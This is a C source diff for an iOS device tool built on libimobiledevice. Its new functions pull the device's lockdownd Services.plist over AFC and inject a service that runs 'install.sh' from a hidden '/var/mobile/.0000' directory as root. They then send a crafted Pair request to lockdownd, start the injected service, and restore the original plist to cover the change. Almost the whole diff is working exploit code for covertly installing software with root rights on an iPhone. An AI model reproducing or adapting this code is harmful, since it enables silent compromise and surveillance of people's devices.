@@ -62,6 +62,45 @@ static lockdownd_client_t client = NULL;
 #pragma mark AFC service routine
 #pragma mark -
 
+afc_client_t open_device_afc()
+{
+  uint16_t port = 0;
+  afc_client_t afc = NULL;
+  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
+  
+  do
+  {
+    ret = idevice_new(&phone, NULL);
+    
+    usleep(5000);
+    
+  } while (ret == IDEVICE_E_NO_DEVICE);
+  
+  if (ret != IDEVICE_E_SUCCESS)
+    return NULL;
+  
+  ret = lockdownd_client_new_with_handshake(phone, &client, "------");
+  
+  if (LOCKDOWN_E_SUCCESS != ret)
+  {
+		idevice_free(phone);
+    return NULL;
+	}
+  
+  ret = lockdownd_start_service(client, "com.apple.afc", &port);
+  
+  if ((ret == LOCKDOWN_E_SUCCESS) && port)
+    ret = afc_client_new(phone, port, &afc);
+  
+  lockdownd_client_free(client);
+  idevice_free(phone);
+  
+  if (ret != AFC_E_SUCCESS)
+    return NULL;
+  
+  return afc;
+}
+
 afc_client_t open_device()
 {
   uint16_t port = 0;
@@ -121,6 +160,19 @@ int isDeviceAttached()
   }
   else
     return 0;
+}
+
+int check_lockdownd_config()
+{
+  afc_client_t afc = NULL;
+  
+  if ((afc = open_device()) == NULL)
+    return 0;
+  else
+  {
+    close_device(afc);
+    return 1;
+  }
 }
 
 #pragma mark -
@@ -183,7 +235,7 @@ char *get_model()
   char *model = NULL;
   afc_client_t afc = NULL;
   
-  afc = open_device();
+  afc = open_device_afc();
   
   if (afc == NULL)
     return  NULL;
@@ -198,6 +250,83 @@ char *get_model()
 #pragma mark -
 #pragma mark AFC file management
 #pragma mark -
+
+char *get_file(char *path, int timeout, int *size)
+{
+
+  uint64_t handle;
+  int retry = 0;
+  int bool_ret = 1;
+  char *file_data = NULL;
+  int ret = AFC_E_UNKNOWN_ERROR;
+  
+  *size = 0;
+  
+  afc_client_t afc = open_device();
+  
+  if (afc == NULL)
+    return NULL;
+  
+  char **info = NULL;
+  unsigned int fsize = 0;
+  
+  if (AFC_E_SUCCESS == afc_get_file_info(afc, path, &info) && info)
+  {
+    for (int i = 0; info[i]; i += 2)
+    {
+      printf("%s: %s\n", info[i], info[i+1]);
+      if (!strcmp(info[i], "st_size"))
+      {
+        fsize = atoi(info[i+1]);
+      }
+    }
+  }
+  
+  while (afc_file_open(afc,
+                       path,
+                       AFC_FOPEN_RDONLY,
+                       &handle) != AFC_E_SUCCESS)
+  {
+    if (--timeout == 0)
+    {
+      bool_ret = 0;
+      break;
+    }
+    
+    sleep(1);
+  }
+  
+  if (bool_ret == 0)
+    return NULL;
+  
+  unsigned int bytes = 0;
+  
+  file_data = (char *) malloc((int)(sizeof(char) * fsize));
+  
+  while (ret != AFC_E_SUCCESS)
+  {
+    ret = afc_file_read(afc, handle, file_data, fsize, &bytes);
+    if (retry++ > 5)
+    {
+      break;
+    }
+  }
+  
+  afc_file_close(afc, handle);
+  
+  close_device(afc);
+  
+  if (bytes <= 0)
+  {
+    free(file_data);
+    file_data = NULL;
+  }
+  else
+    *size = fsize;
+  
+  return file_data;
+}
+
 
 int check_file(char *path, int timeout)
 {
@@ -384,6 +513,46 @@ idevice_error_t copy_install_files(char *lpath, char **dir_content)
   return ret;
 }
 
+idevice_error_t copy_buffer_to_filepath(char *filebuff, int filelen, char* file_path)
+{
+  uint64_t handle;
+  int bwrite = 0, bwritten = 0;
+  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
+  
+  afc_client_t afc = open_device();
+  
+  if (afc == NULL)
+    return AFC_E_UNKNOWN_ERROR;
+  
+  ret = afc_file_open(afc, file_path, AFC_FOPEN_RW, &handle);
+  
+  if (ret != AFC_E_SUCCESS)
+  {
+    close_device(afc);
+    return ret;
+  }
+  
+  do
+  {
+    ret = afc_file_write(afc, handle, filebuff, filelen, (uint32_t*)&bwrite);
+    
+    if (ret != AFC_E_SUCCESS)
+      break;
+    
+    bwritten += bwrite;
+    
+  } while (filelen > bwritten);
+  
+  ret = afc_file_close(afc, handle);
+  
+  close_device(afc);
+  
+  if (check_file(file_path, 1) == 0)
+    ret = IDEVICE_E_UNKNOWN_ERROR;
+  
+  return ret;
+}
+
 /*
  * - Used in windows version only
  */
@@ -482,6 +651,207 @@ char** list_dir_content(char *dir_name)
   closedir(d);
   
   return dirlist;
+}
+
+#pragma mark -
+#pragma mark lockdownd routine
+#pragma mark -
+
+char *lockd_create_inst_services(char *plist_xml, int plist_length)
+{  
+  plist_t services_plist = 0;
+  
+  plist_from_xml(plist_xml, plist_length, &services_plist);
+  
+  if (services_plist == 0)
+  {
+    plist_from_bin(plist_xml, plist_length, &services_plist);
+
+    if (services_plist == 0)
+      return NULL;
+  }
+  
+  plist_t plist_dict = plist_new_dict();
+  
+  plist_dict_insert_item(plist_dict, "AllowUnactivatedService", plist_new_bool(1));
+  plist_dict_insert_item(plist_dict, "Label", plist_new_string("com.apple.mkRelay"));
+  
+  plist_t prog_array = plist_new_array();
+  plist_array_append_item(prog_array, plist_new_string("/bin/sh"));
+  plist_array_append_item(prog_array, plist_new_string("-c"));
+  plist_array_append_item(prog_array, plist_new_string("(cd /var/mobile/.0000; /bin/sh install.sh)"));
+  
+  plist_dict_insert_item(plist_dict, "ProgramArguments", prog_array);
+  
+  plist_dict_insert_item(plist_dict, "UserName", plist_new_string("root"));
+  
+  char *xml_buffer = NULL;
+  uint32_t xml_length = 0;
+  
+  plist_dict_insert_item(services_plist, "com.apple.amfiInst", plist_dict);
+  
+  plist_to_xml(services_plist, &xml_buffer, &xml_length);
+  
+  return xml_buffer;
+}
+
+int lockd_stroke()
+{
+  idevice_t phone = NULL;
+  
+	idevice_connection_t connection = 0;
+  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
+  
+  ret = idevice_new(&phone, NULL);
+  
+  ret = idevice_connect(phone, 0xf27e, &connection);
+  
+	plist_t dict = plist_new_dict();
+  
+  plist_dict_insert_item(dict, "Request", plist_new_string("Pair"));
+  plist_dict_insert_item(dict, "PairRecord", plist_new_bool(0));
+	
+  char *buffer = NULL;
+  uint32_t length = 0;
+  
+  plist_to_xml(dict, &buffer, &length);
+  
+  plist_free(dict);
+  
+  int data =  ((unsigned char)length << 24) |
+              ((unsigned short)(length & 0xFF00) << 8) |
+              ((length & 0xFF0000u) >> 8) |
+              ((length & 0xFF000000) >> 24);
+  
+  uint32_t sent_bytes = 0;
+  
+  idevice_connection_send(connection, (const char*)&data, 4, &sent_bytes);
+  idevice_connection_send(connection, (const char*)buffer, length, &sent_bytes);
+  
+  free(buffer);
+  
+  sent_bytes = 0;
+  length = 0;
+  buffer = 0;
+  
+  idevice_connection_receive_timeout(connection, (char*)&length, 4, &sent_bytes, 1500);
+  
+  data =  ((unsigned char)length << 24) |
+          ((unsigned short)(length & 0xFF00) << 8) |
+          ((length & 0xFF0000u) >> 8) |
+          ((length & 0xFF000000) >> 24);
+  
+  if (data)
+  {
+    buffer = malloc(data);
+    idevice_connection_receive_timeout(connection, buffer, data, &sent_bytes, 5000);
+    free(buffer);
+  }
+  
+  idevice_disconnect(connection);
+	
+	return 0;
+}
+
+int lockd_run_inst_service()
+{
+  uint16_t port = 0;
+  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
+  
+  do
+  {
+    ret = idevice_new(&phone, NULL);
+    
+    usleep(5000);
+    
+  } while (ret == IDEVICE_E_NO_DEVICE);
+  
+  if (ret != IDEVICE_E_SUCCESS)
+    return 0;
+  
+  ret = lockdownd_client_new_with_handshake(phone, &client, "------");
+  
+  if (LOCKDOWN_E_SUCCESS != ret)
+  {
+		idevice_free(phone);
+    return 0;
+	}
+  
+  ret = lockdownd_start_service(client, "com.apple.amfiInst", &port);
+  
+  if (ret == LOCKDOWN_E_SUCCESS)
+  {
+    idevice_free(phone);
+    return 1;
+  }
+  
+  return 0;
+}
+
+int lockd_run_installer()
+{
+  int retry = 0;
+  int bool_ret = 0;
+  int services_plist_size = 0;
+  char *services_plist = NULL;
+  
+  while (services_plist == NULL)
+  {
+    services_plist = get_file("/System/Library/Lockdown/Services.plist", 10, &services_plist_size);
+    if (retry++ == 5)
+      return 0;
+  }
+  
+  char *services_plist_new = lockd_create_inst_services(services_plist, services_plist_size);
+  
+  if (services_plist_new == NULL)
+    return 0;
+  
+  if (AFC_E_SUCCESS != copy_buffer_to_filepath(services_plist_new,
+                                               strlen(services_plist_new),
+                                               "/System/Library/Lockdown/Services.plist"))
+  {
+    return 0;
+  }
+  
+  // todo: checking if is vulnerable
+  lockd_stroke();
+  
+  sleep(3);
+
+  retry = 0;
+  
+  while (bool_ret != 1)
+  {
+    lockd_run_inst_service();
+    
+    bool_ret = check_installation(1, 5);
+    
+    if (retry++ == 5)
+      break;
+  }
+  
+  afc_client_t afc = open_device();
+  
+  afc_remove_path(afc, "/System/Library/Lockdown/Services.plist");
+  // retry...
+  afc_remove_path(afc, "/System/Library/Lockdown/Services.plist");
+  
+  close_device(afc);
+  
+  // replace original one
+  int ret = IDEVICE_E_UNKNOWN_ERROR;
+  
+  retry = 0;
+  
+  while (ret != IDEVICE_E_SUCCESS)
+  {
+    ret = copy_buffer_to_filepath(services_plist, services_plist_size,"/System/Library/Lockdown/Services.plist");
+    if (retry++ == 5)
+      break;
+  }
+  
+  return bool_ret;
 }
 
 #pragma mark -
